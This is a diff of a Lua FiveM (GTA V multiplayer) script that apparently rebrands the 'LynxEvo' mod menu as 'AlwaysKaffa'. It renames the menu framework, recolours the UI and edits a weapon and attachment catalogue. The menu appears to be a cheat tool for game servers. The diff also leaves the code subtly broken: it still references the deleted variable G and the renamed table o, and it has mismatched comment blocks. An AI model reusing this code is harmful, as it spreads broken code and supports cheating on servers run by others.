@@ -1,4 +1,5 @@
-local mhaonn = true
+--[[
+--[[
 ESX = nil
 Citizen.CreateThread(
     function()
@@ -13,14 +14,15 @@ Citizen.CreateThread(
         end
     end
 )
-local function e()
-    local name = GetPlayerName(PlayerId())
-end
-local h = false
-rot = 1
-local j = false
-LynxEvo = {}
-LynxEvo.debug = false
+--]]
+
+AlwaysKaffa = {}
+AlwaysKaffa.debug = false
+
+local H4tuf5 = true
+local LMl35d = false
+local wtB2JF = "test"
+
 local function k(l)
     local m = {}
     local n = GetGameTimer() / 200
@@ -29,7 +31,7 @@ local function k(l)
     m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
     return m
 end
-local o = {}
+local menuso = {}
 local p = {
     up = 172,
     down = 173,
@@ -50,29 +52,28 @@ local C = 0
 local D = 0.370
 local E = 0.005
 local F = 0.005
-local G = '34ByTe Community'
 local function H(I)
-    if LynxEvo.debug then
-        Citizen.Trace('[LynxEvo] ' .. tostring(I))
+    if AlwaysKaffa.debug then
+        Citizen.Trace('[AlwaysKaffa] ' .. tostring(I))
     end
 end
 local function J(f, K, value)
-    if f and o[f] then
-        o[f][K] = value
+    if f and menuso[f] then
+        menuso[f][K] = value
         H(f .. ' menu property changed: { ' .. tostring(K) .. ', ' .. tostring(value) .. ' }')
     end
 end
 local function L(f)
-    if f and o[f] then
-        return o[f].visible
+    if f and menuso[f] then
+        return menuso[f].visible
     else
         return false
     end
 end
 local function M(f, N, O)
-    if f and o[f] then
+    if f and menuso[f] then
         J(f, 'visible', N)
-        if not O and o[f] then
+        if not O and menuso[f] then
             J(f, 'currentOption', 1)
         end
         if N then
@@ -90,11 +91,11 @@ local function P(I, x, y, Q, R, S, T, U, V)
     if U then
         SetTextDropShadow(2, 2, 0, 0, 0)
     end
-    if o[t] then
+    if menuso[t] then
         if T then
             SetTextCentre(T)
         elseif V then
-            SetTextWrap(o[t].x, o[t].x + u - E)
+            SetTextWrap(menuso[t].x, menuso[t].x + u - E)
             SetTextRightJustify(true)
         end
     end
@@ -106,13 +107,13 @@ local function W(x, y, X, height, R)
     DrawRect(x, y, X, height, R.r, R.g, R.b, R.a)
 end
 local function Y()
-    if o[t] then
-        local x = o[t].x + u / 2
-        local y = o[t].y + v / 2
-        if o[t].titleBackgroundSprite then
+    if menuso[t] then
+        local x = menuso[t].x + u / 2
+        local y = menuso[t].y + v / 2
+        if menuso[t].titleBackgroundSprite then
             DrawSprite(
-                o[t].titleBackgroundSprite.dict,
-                o[t].titleBackgroundSprite.name,
+                menuso[t].titleBackgroundSprite.dict,
+                menuso[t].titleBackgroundSprite.name,
                 x,
                 y,
                 u,
@@ -124,27 +125,27 @@ local function Y()
                 255
             )
         else
-            W(x, y, u, v, o[t].titleBackgroundColor)
+            W(x, y, u, v, menuso[t].titleBackgroundColor)
         end
-        P(o[t].title, x, y - v / 2 + w, o[t].titleFont, o[t].titleColor, A, true)
+        P(menuso[t].title, x, y - v / 2 + w, menuso[t].titleFont, menuso[t].titleColor, A, true)
     end
 end
 local function Z()
-    if o[t] then
-        local x = o[t].x + u / 2
-        local y = o[t].y + v + B / 2
+    if menuso[t] then
+        local x = menuso[t].x + u / 2
+        local y = menuso[t].y + v + B / 2
         local a0 = {
-            r = o[t].titleBackgroundColor.r,
-            g = o[t].titleBackgroundColor.g,
-            b = o[t].titleBackgroundColor.b,
+            r = menuso[t].titleBackgroundColor.r,
+            g = menuso[t].titleBackgroundColor.g,
+            b = menuso[t].titleBackgroundColor.b,
             a = 255
         }
-        W(x, y, u, B, o[t].subTitleBackgroundColor)
-        P(o[t].subTitle, o[t].x + E, y - B / 2 + F, C, a0, D, false)
-        if q > o[t].maxOptionCount then
+        W(x, y, u, B, menuso[t].subTitleBackgroundColor)
+        P(menuso[t].subTitle, menuso[t].x + E, y - B / 2 + F, C, a0, D, false)
+        if q > menuso[t].maxOptionCount then
             P(
-                tostring(o[t].currentOption) .. ' / ' .. tostring(q),
-                o[t].x + u,
+                tostring(menuso[t].currentOption) .. ' / ' .. tostring(q),
+                menuso[t].x + u,
                 y - B / 2 + F,
                 C,
                 a0,
@@ -157,151 +158,154 @@ local function Z()
     end
 end
 local function a1(I, a2)
-    local x = o[t].x + u / 2
+    local x = menuso[t].x + u / 2
     local a3 = nil
-    if o[t].currentOption <= o[t].maxOptionCount and q <= o[t].maxOptionCount then
+    if menuso[t].currentOption <= menuso[t].maxOptionCount and q <= menuso[t].maxOptionCount then
         a3 = q
-    elseif q > o[t].currentOption - o[t].maxOptionCount and q <= o[t].currentOption then
-        a3 = q - (o[t].currentOption - o[t].maxOptionCount)
+    elseif q > menuso[t].currentOption - menuso[t].maxOptionCount and q <= menuso[t].currentOption then
+        a3 = q - (menuso[t].currentOption - menuso[t].maxOptionCount)
     end
     if a3 then
-        local y = o[t].y + v + B + B * a3 - B / 2
+        local y = menuso[t].y + v + B + B * a3 - B / 2
         local a4 = nil
         local a5 = nil
         local a6 = nil
         local U = false
-        if o[t].currentOption == q then
-            a4 = o[t].menuFocusBackgroundColor
-            a5 = o[t].menuFocusTextColor
-            a6 = o[t].menuFocusTextColor
+        if menuso[t].currentOption == q then
+            a4 = menuso[t].menuFocusBackgroundColor
+            a5 = menuso[t].menuFocusTextColor
+            a6 = menuso[t].menuFocusTextColor
         else
-            a4 = o[t].menuBackgroundColor
-            a5 = o[t].menuTextColor
-            a6 = o[t].menuSubTextColor
+            a4 = menuso[t].menuBackgroundColor
+            a5 = menuso[t].menuTextColor
+            a6 = menuso[t].menuSubTextColor
             U = true
         end
         W(x, y, u, B, a4)
-        P(I, o[t].x + E, y - B / 2 + F, C, a5, D, false, U)
+        P(I, menuso[t].x + E, y - B / 2 + F, C, a5, D, false, U)
         if a2 then
-            P(a2, o[t].x + E, y - B / 2 + F, C, a6, D, false, U, true)
+            P(a2, menuso[t].x + E, y - B / 2 + F, C, a6, D, false, U, true)
         end
     end
 end
 
-function LynxEvo.CreateMenu(f, a7)
-    o[f] = {}
-    o[f].title = a7
-    o[f].subTitle = G
-    o[f].visible = false
-    o[f].previousMenu = nil
-    o[f].aboutToBeClosed = false
-    o[f].x = 0.75
-    o[f].y = 0.19
-    o[f].currentOption = 1
-    o[f].maxOptionCount = 10
-    o[f].titleFont = 1
-    o[f].titleColor = {
-        r = 255,
-        g = 255,
-        b = 255,
-        a = 255
+function AlwaysKaffa.CreateMenu(f, a7)
+    menuso[f] = {}
+    menuso[f].title = a7
+    menuso[f].subTitle = G
+    menuso[f].visible = false
+    menuso[f].previousMenu = nil
+    menuso[f].aboutToBeClosed = false
+    menuso[f].x = 0.75
+    menuso[f].y = 0.19
+    menuso[f].currentOption = 1
+    menuso[f].maxOptionCount = 10
+    menuso[f].titleFont = 1
+    menuso[f].titleColor = {
+        r = 215,
+        g = 215,
+        b = 215,
+        a = 215
     }
     Citizen.CreateThread(
         function()
             while true do
                 Citizen.Wait(0)
                 local a8 = k(1.0)
-                o[f].titleBackgroundColor = {
-                    r = a8.r,
-                    g = a8.g,
-                    b = a8.b,
-                    a = 105
+                menuso[f].titleBackgroundColor = {
+                    --r = a8.r,
+                    --g = a8.g,
+                    --b = a8.b,
+                    r = 185,
+                    g = 185,
+                    b = 185,
+                    a = 155
                 }
-                o[f].menuFocusBackgroundColor = {
-                    r = 255,
-                    g = 255,
-                    b = 255,
-                    a = 100
+                menuso[f].menuFocusBackgroundColor = {
+                    r = 155,
+                    g = 155,
+                    b = 155,
+                    a = 155
                 }
             end
         end
     )
-    o[f].titleBackgroundSprite = nil
-    o[f].menuTextColor = {
-        r = 255,
-        g = 255,
-        b = 255,
+    menuso[f].titleBackgroundSprite = nil
+    menuso[f].menuTextColor = {
+        r = 175,
+        g = 175,
+        b = 175,
         a = 255
     }
-    o[f].menuSubTextColor = {
-        r = 189,
-        g = 189,
-        b = 189,
+    menuso[f].menuSubTextColor = {
+        r = 155,
+        g = 155,
+        b = 155,
         a = 255
     }
-    o[f].menuFocusTextColor = {
-        r = 255,
-        g = 255,
-        b = 255,
+    menuso[f].menuFocusTextColor = {
+        r = 125,
+        g = 125,
+        b = 125,
         a = 255
     }
-    o[f].menuBackgroundColor = {
-        r = 0,
-        g = 0,
-        b = 0,
+    menuso[f].menuBackgroundColor = {
+        r = 45,
+        g = 45,
+        b = 45,
         a = 100
     }
-    o[f].subTitleBackgroundColor = {
-        r = o[f].menuBackgroundColor.r,
-        g = o[f].menuBackgroundColor.g,
-        b = o[f].menuBackgroundColor.b,
+    menuso[f].subTitleBackgroundColor = {
+        r = menuso[f].menuBackgroundColor.r,
+        g = menuso[f].menuBackgroundColor.g,
+        b = menuso[f].menuBackgroundColor.b,
         a = 255
     }
-    o[f].buttonPressedSound = {
-        name = '~h~~r~> ~s~SELECT',
+    menuso[f].buttonPressedSound = {
+        name = '~h~~p~» ~s~SELECT',
         set = 'HUD_FRONTEND_DEFAULT_SOUNDSET'
     }
     H(tostring(f) .. ' menu created')
 end
 
-function LynxEvo.CreateSubMenu(f, a9, aa)
-    if o[a9] then
-        LynxEvo.CreateMenu(f, o[a9].title)
+function AlwaysKaffa.CreateSubMenu(f, a9, aa)
+    if menuso[a9] then
+        AlwaysKaffa.CreateMenu(f, menuso[a9].title)
         if aa then
             J(f, 'subTitle', aa)
         else
-            J(f, 'subTitle', o[a9].subTitle)
+            J(f, 'subTitle', menuso[a9].subTitle)
         end
         J(f, 'previousMenu', a9)
-        J(f, 'x', o[a9].x)
-        J(f, 'y', o[a9].y)
-        J(f, 'maxOptionCount', o[a9].maxOptionCount)
-        J(f, 'titleFont', o[a9].titleFont)
-        J(f, 'titleColor', o[a9].titleColor)
-        J(f, 'titleBackgroundColor', o[a9].titleBackgroundColor)
-        J(f, 'titleBackgroundSprite', o[a9].titleBackgroundSprite)
-        J(f, 'menuTextColor', o[a9].menuTextColor)
-        J(f, 'menuSubTextColor', o[a9].menuSubTextColor)
-        J(f, 'menuFocusTextColor', o[a9].menuFocusTextColor)
-        J(f, 'menuFocusBackgroundColor', o[a9].menuFocusBackgroundColor)
-        J(f, 'menuBackgroundColor', o[a9].menuBackgroundColor)
-        J(f, 'subTitleBackgroundColor', o[a9].subTitleBackgroundColor)
+        J(f, 'x', menuso[a9].x)
+        J(f, 'y', menuso[a9].y)
+        J(f, 'maxOptionCount', menuso[a9].maxOptionCount)
+        J(f, 'titleFont', menuso[a9].titleFont)
+        J(f, 'titleColor', menuso[a9].titleColor)
+        J(f, 'titleBackgroundColor', menuso[a9].titleBackgroundColor)
+        J(f, 'titleBackgroundSprite', menuso[a9].titleBackgroundSprite)
+        J(f, 'menuTextColor', menuso[a9].menuTextColor)
+        J(f, 'menuSubTextColor', menuso[a9].menuSubTextColor)
+        J(f, 'menuFocusTextColor', menuso[a9].menuFocusTextColor)
+        J(f, 'menuFocusBackgroundColor', menuso[a9].menuFocusBackgroundColor)
+        J(f, 'menuBackgroundColor', menuso[a9].menuBackgroundColor)
+        J(f, 'subTitleBackgroundColor', menuso[a9].subTitleBackgroundColor)
     else
         H('Failed to create ' .. tostring(f) .. ' submenu: ' .. tostring(a9) .. " parent menu doesn't exist")
     end
 end
 
-function LynxEvo.CurrentMenu()
+function AlwaysKaffa.CurrentMenu()
     return t
 end
 
-function LynxEvo.OpenMenu(f)
-    if f and o[f] then
-        PlaySoundFrontend(-1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
+function AlwaysKaffa.OpenMenu(f)
+    if f and menuso[f] then
+        --PlaySoundFrontend(-1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
         M(f, true)
-        if o[f].titleBackgroundSprite then
-            RequestStreamedTextureDict(o[f].titleBackgroundSprite.dict, false)
-            while not HasStreamedTextureDictLoaded(o[f].titleBackgroundSprite.dict) do
+        if menuso[f].titleBackgroundSprite then
+            RequestStreamedTextureDict(menuso[f].titleBackgroundSprite.dict, false)
+            while not HasStreamedTextureDictLoaded(menuso[f].titleBackgroundSprite.dict) do
                 Citizen.Wait(0)
             end
         end
@@ -311,11 +315,11 @@ function LynxEvo.OpenMenu(f)
     end
 end
 
-function LynxEvo.IsMenuOpened(f)
+function AlwaysKaffa.IsMenuOpened(f)
     return L(f)
 end
 
-function LynxEvo.IsAnyMenuOpened()
+function AlwaysKaffa.IsAnyMenuOpened()
     for f, _ in pairs(o) do
         if L(f) then
             return true
@@ -324,18 +328,18 @@ function LynxEvo.IsAnyMenuOpened()
     return false
 end
 
-function LynxEvo.IsMenuAboutToBeClosed()
-    if o[t] then
-        return o[t].aboutToBeClosed
+function AlwaysKaffa.IsMenuAboutToBeClosed()
+    if menuso[t] then
+        return menuso[t].aboutToBeClosed
     else
         return false
     end
 end
 
-function LynxEvo.CloseMenu()
-    if o[t] then
-        if o[t].aboutToBeClosed then
-            o[t].aboutToBeClosed = false
+function AlwaysKaffa.CloseMenu()
+    if menuso[t] then
+        if menuso[t].aboutToBeClosed then
+            menuso[t].aboutToBeClosed = false
             M(t, false)
             H(tostring(t) .. ' menu closed')
             PlaySoundFrontend(-1, 'QUIT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
@@ -343,24 +347,24 @@ function LynxEvo.CloseMenu()
             t = nil
             s = nil
         else
-            o[t].aboutToBeClosed = true
+            menuso[t].aboutToBeClosed = true
             H(tostring(t) .. ' menu about to be closed')
         end
     end
 end
 
-function LynxEvo.Button(I, a2)
+function AlwaysKaffa.Button(I, a2)
     local ab = I
     if a2 then
         ab = '{ ' .. tostring(ab) .. ', ' .. tostring(a2) .. ' }'
     end
-    if o[t] then
+    if menuso[t] then
         q = q + 1
-        local ac = o[t].currentOption == q
+        local ac = menuso[t].currentOption == q
         a1(I, a2)
         if ac then
             if s == p.select then
-                PlaySoundFrontend(-1, o[t].buttonPressedSound.name, o[t].buttonPressedSound.set, true)
+                PlaySoundFrontend(-1, menuso[t].buttonPressedSound.name, menuso[t].buttonPressedSound.set, true)
                 H(ab .. ' button pressed')
                 return true
             elseif s == p.left or s == p.right then
@@ -374,9 +378,9 @@ function LynxEvo.Button(I, a2)
     end
 end
 
-function LynxEvo.MenuButton(I, f)
-    if o[f] then
-        if LynxEvo.Button(I) then
+function AlwaysKaffa.MenuButton(I, f)
+    if menuso[f] then
+        if AlwaysKaffa.Button(I) then
             M(t, false)
             M(f, true, true)
             return true
@@ -387,12 +391,12 @@ function LynxEvo.MenuButton(I, f)
     return false
 end
 
-function LynxEvo.CheckBox(I, bool, ad)
+function AlwaysKaffa.CheckBox(I, bool, ad)
     local ae = '~r~~h~OFF'
     if bool then
         ae = '~g~~h~ON'
     end
-    if LynxEvo.Button(I, ae) then
+    if AlwaysKaffa.Button(I, ae) then
         bool = not bool
         H(tostring(I) .. ' checkbox changed to ' .. tostring(bool))
         ad(bool)
@@ -401,14 +405,14 @@ function LynxEvo.CheckBox(I, bool, ad)
     return false
 end
 
-function LynxEvo.ComboBox(I, af, ag, ah, ad)
+function AlwaysKaffa.ComboBox(I, af, ag, ah, ad)
     local ai = #af
     local aj = af[ag]
-    local ac = o[t].currentOption == q + 1
+    local ac = menuso[t].currentOption == q + 1
     if ai > 1 and ac then
         aj = '← ' .. tostring(aj) .. ' →'
     end
-    if LynxEvo.Button(I, aj) then
+    if AlwaysKaffa.Button(I, aj) then
         ah = ag
         ad(ag, ah)
         return true
@@ -433,10 +437,10 @@ function LynxEvo.ComboBox(I, af, ag, ah, ad)
     return false
 end
 
-function LynxEvo.Display()
+function AlwaysKaffa.Display()
     if L(t) then
-        if o[t].aboutToBeClosed then
-            LynxEvo.CloseMenu()
+        if menuso[t].aboutToBeClosed then
+            AlwaysKaffa.CloseMenu()
         else
             ClearAllHelpMessages()
             Y()
@@ -444,17 +448,17 @@ function LynxEvo.Display()
             s = nil
             if IsDisabledControlJustPressed(0, p.down) then
                 PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
-                if o[t].currentOption < q then
-                    o[t].currentOption = o[t].currentOption + 1
+                if menuso[t].currentOption < q then
+                    menuso[t].currentOption = menuso[t].currentOption + 1
                 else
-                    o[t].currentOption = 1
+                    menuso[t].currentOption = 1
                 end
             elseif IsDisabledControlJustPressed(0, p.up) then
                 PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
-                if o[t].currentOption > 1 then
-                    o[t].currentOption = o[t].currentOption - 1
+                if menuso[t].currentOption > 1 then
+                    menuso[t].currentOption = menuso[t].currentOption - 1
                 else
-                    o[t].currentOption = q
+                    menuso[t].currentOption = q
                 end
             elseif IsDisabledControlJustPressed(0, p.left) then
                 s = p.left
@@ -463,11 +467,11 @@ function LynxEvo.Display()
             elseif IsDisabledControlJustPressed(0, p.select) then
                 s = p.select
             elseif IsDisabledControlJustPressed(0, p.back) then
-                if o[o[t].previousMenu] then
+                if menuso[menuso[t].previousMenu] then
                     PlaySoundFrontend(-1, 'BACK', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
-                    M(o[t].previousMenu, true)
+                    M(menuso[t].previousMenu, true)
                 else
-                    LynxEvo.CloseMenu()
+                    AlwaysKaffa.CloseMenu()
                 end
             end
             q = 0
@@ -475,23 +479,23 @@ function LynxEvo.Display()
     end
 end
 
-function LynxEvo.SetMenuWidth(f, X)
+function AlwaysKaffa.SetMenuWidth(f, X)
     J(f, 'width', X)
 end
 
-function LynxEvo.SetMenuX(f, x)
+function AlwaysKaffa.SetMenuX(f, x)
     J(f, 'x', x)
 end
 
-function LynxEvo.SetMenuY(f, y)
+function AlwaysKaffa.SetMenuY(f, y)
     J(f, 'y', y)
 end
 
-function LynxEvo.SetMenuMaxOptionCountOnScreen(f, count)
+function AlwaysKaffa.SetMenuMaxOptionCountOnScreen(f, count)
     J(f, 'maxOptionCount', count)
 end
 
-function LynxEvo.SetTitleColor(f, r, g, b, ak)
+function AlwaysKaffa.SetTitleColor(f, r, g, b, ak)
     J(
         f,
         'titleColor',
@@ -499,12 +503,12 @@ function LynxEvo.SetTitleColor(f, r, g, b, ak)
             ['r'] = r,
             ['g'] = g,
             ['b'] = b,
-            ['a'] = ak or o[f].titleColor.a
+            ['a'] = ak or menuso[f].titleColor.a
         }
     )
 end
 
-function LynxEvo.SetTitleBackgroundColor(f, r, g, b, ak)
+function AlwaysKaffa.SetTitleBackgroundColor(f, r, g, b, ak)
     J(
         f,
         'titleBackgroundColor',
@@ -512,12 +516,12 @@ function LynxEvo.SetTitleBackgroundColor(f, r, g, b, ak)
             ['r'] = r,
             ['g'] = g,
             ['b'] = b,
-            ['a'] = ak or o[f].titleBackgroundColor.a
+            ['a'] = ak or menuso[f].titleBackgroundColor.a
         }
     )
 end
 
-function LynxEvo.SetTitleBackgroundSprite(f, al, am)
+function AlwaysKaffa.SetTitleBackgroundSprite(f, al, am)
     J(
         f,
         'titleBackgroundSprite',
@@ -528,11 +532,11 @@ function LynxEvo.SetTitleBackgroundSprite(f, al, am)
     )
 end
 
-function LynxEvo.SetSubTitle(f, I)
+function AlwaysKaffa.SetSubTitle(f, I)
     J(f, 'subTitle', I)
 end
 
-function LynxEvo.SetMenuBackgroundColor(f, r, g, b, ak)
+function AlwaysKaffa.SetMenuBackgroundColor(f, r, g, b, ak)
     J(
         f,
         'menuBackgroundColor',
@@ -540,12 +544,12 @@ function LynxEvo.SetMenuBackgroundColor(f, r, g, b, ak)
             ['r'] = r,
             ['g'] = g,
             ['b'] = b,
-            ['a'] = ak or o[f].menuBackgroundColor.a
+            ['a'] = ak or menuso[f].menuBackgroundColor.a
         }
     )
 end
 
-function LynxEvo.SetMenuTextColor(f, r, g, b, ak)
+function AlwaysKaffa.SetMenuTextColor(f, r, g, b, ak)
     J(
         f,
         'menuTextColor',
@@ -553,12 +557,12 @@ function LynxEvo.SetMenuTextColor(f, r, g, b, ak)
             ['r'] = r,
             ['g'] = g,
             ['b'] = b,
-            ['a'] = ak or o[f].menuTextColor.a
+            ['a'] = ak or menuso[f].menuTextColor.a
         }
     )
 end
 
-function LynxEvo.SetMenuSubTextColor(f, r, g, b, ak)
+function AlwaysKaffa.SetMenuSubTextColor(f, r, g, b, ak)
     J(
         f,
         'menuSubTextColor',
@@ -566,12 +570,12 @@ function LynxEvo.SetMenuSubTextColor(f, r, g, b, ak)
             ['r'] = r,
             ['g'] = g,
             ['b'] = b,
-            ['a'] = ak or o[f].menuSubTextColor.a
+            ['a'] = ak or menuso[f].menuSubTextColor.a
         }
     )
 end
 
-function LynxEvo.SetMenuFocusColor(f, r, g, b, ak)
+function AlwaysKaffa.SetMenuFocusColor(f, r, g, b, ak)
     J(
         f,
         'menuFocusColor',
@@ -579,12 +583,12 @@ function LynxEvo.SetMenuFocusColor(f, r, g, b, ak)
             ['r'] = r,
             ['g'] = g,
             ['b'] = b,
-            ['a'] = ak or o[f].menuFocusColor.a
+            ['a'] = ak or menuso[f].menuFocusColor.a
         }
     )
 end
 
-function LynxEvo.SetMenuButtonPressedSound(f, name, an)
+function AlwaysKaffa.SetMenuButtonPressedSound(f, name, an)
     J(
         f,
         'buttonPressedSound',
@@ -1585,100 +1589,104 @@ local b6 = {
     'WEAPON_FLARE',
     'WEAPON_BALL'
 }
+local bPistol = {
+    'WEAPON_PISTOL',    
+}
 local b7 = {
     Melee = {
         BaseballBat = {
             id = 'weapon_bat',
-            name = '~h~~r~> ~s~Baseball Bat',
+            name = '~h~~p~» ~s~Baseball Bat',
             bInfAmmo = false,
             mods = {}
         },
         BrokenBottle = {
             id = 'weapon_bottle',
-            name = '~h~~r~> ~s~Broken Bottle',
+            name = '~h~~p~» ~s~Broken Bottle',
             bInfAmmo = false,
             mods = {}
         },
         Crowbar = {
             id = 'weapon_Crowbar',
-            name = '~h~~r~> ~s~Crowbar',
+            name = '~h~~p~» ~s~Crowbar',
             bInfAmmo = false,
             mods = {}
         },
         Flashlight = {
             id = 'weapon_flashlight',
-            name = '~h~~r~> ~s~Flashlight',
+            name = '~h~~p~» ~s~Flashlight',
             bInfAmmo = false,
             mods = {}
         },
         GolfClub = {
             id = 'weapon_golfclub',
-            name = '~h~~r~> ~s~Golf Club',
+            name = '~h~~p~» ~s~Golf Club',
             bInfAmmo = false,
             mods = {}
         },
         BrassKnuckles = {
             id = 'weapon_knuckle',
-            name = '~h~~r~> ~s~Brass Knuckles',
+            name = '~h~~p~» ~s~Brass Knuckles',
             bInfAmmo = false,
             mods = {}
         },
         Knife = {
             id = 'weapon_knife',
-            name = '~h~~r~> ~s~Knife',
+            name = '~h~~p~» ~s~Knife',
             bInfAmmo = false,
             mods = {}
         },
         Machete = {
             id = 'weapon_machete',
-            name = '~h~~r~> ~s~Machete',
+            name = '~h~~p~» ~s~Machete',
             bInfAmmo = false,
             mods = {}
         },
         Switchblade = {
             id = 'weapon_switchblade',
-            name = '~h~~r~> ~s~Switchblade',
+            name = '~h~~p~» ~s~Switchblade',
             bInfAmmo = false,
             mods = {}
         },
         Nightstick = {
             id = 'weapon_nightstick',
-            name = '~h~~r~> ~s~Nightstick',
+            name = '~h~~p~» ~s~Nightstick',
             bInfAmmo = false,
             mods = {}
         },
         BattleAxe = {
             id = 'weapon_battleaxe',
-            name = '~h~~r~> ~s~Battle Axe',
+            name = '~h~~p~» ~s~Battle Axe',
             bInfAmmo = false,
             mods = {}
         }
     },
+	
     Handguns = {
         Pistol = {
             id = 'weapon_pistol',
-            name = '~h~~r~> ~s~Pistol',
+            name = '~h~~p~» ~s~Pistol',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_PISTOL_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_PISTOL_CLIP_02'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_PI_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_PI_SUPP_02'
                     }
                 }
@@ -1686,54 +1694,54 @@ local b7 = {
         },
         PistolMK2 = {
             id = 'weapon_pistol_mk2',
-            name = '~h~~r~> ~s~Pistol MK 2',
+            name = '~h~~p~» ~s~Pistol MK 2',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_PISTOL_MK2_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_PISTOL_MK2_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Tracer Rounds',
+                        name = '~h~~p~» ~s~Tracer Rounds',
                         id = 'COMPONENT_PISTOL_MK2_CLIP_TRACER'
                     },
                     {
-                        name = '~h~~r~> ~s~Incendiary Rounds',
+                        name = '~h~~p~» ~s~Incendiary Rounds',
                         id = 'COMPONENT_PISTOL_MK2_CLIP_INCENDIARY'
                     },
                     {
-                        name = '~h~~r~> ~s~Hollow Point Rounds',
+                        name = '~h~~p~» ~s~Hollow Point Rounds',
                         id = 'COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT'
                     },
                     {
-                        name = '~h~~r~> ~s~FMJ Rounds',
+                        name = '~h~~p~» ~s~FMJ Rounds',
                         id = 'COMPONENT_PISTOL_MK2_CLIP_FMJ'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Mounted Scope',
+                        name = '~h~~p~» ~s~Mounted Scope',
                         id = 'COMPONENT_AT_PI_RAIL'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_PI_FLSH_02'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Compensator',
+                        name = '~h~~p~» ~s~Compensator',
                         id = 'COMPONENT_AT_PI_COMP'
                     },
                     {
-                        name = '~h~~r~> ~s~Suppessor',
+                        name = '~h~~p~» ~s~Suppessor',
                         id = 'COMPONENT_AT_PI_SUPP_02'
                     }
                 }
@@ -1746,23 +1754,23 @@ local b7 = {
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_COMBATPISTOL_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_COMBATPISTOL_CLIP_02'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_PI_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_PI_SUPP'
                     }
                 }
@@ -1775,23 +1783,23 @@ local b7 = {
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_APPISTOL_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_APPISTOL_CLIP_02'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_PI_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_PI_SUPP'
                     }
                 }
@@ -1799,34 +1807,34 @@ local b7 = {
         },
         StunGun = {
             id = 'weapon_stungun',
-            name = '~h~~r~> ~s~Stun Gun',
+            name = '~h~~p~» ~s~Stun Gun',
             bInfAmmo = false,
             mods = {}
         },
         Pistol50 = {
             id = 'weapon_pistol50',
-            name = '~h~~r~> ~s~Pistol .50',
+            name = '~h~~p~» ~s~Pistol .50',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_PISTOL50_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_PISTOL50_CLIP_02'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_PI_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_PI_SUPP_02'
                     }
                 }
@@ -1834,16 +1842,16 @@ local b7 = {
         },
         SNSPistol = {
             id = 'weapon_snspistol',
-            name = '~h~~r~> ~s~SNS Pistol',
+            name = '~h~~p~» ~s~SNS Pistol',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_SNSPISTOL_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
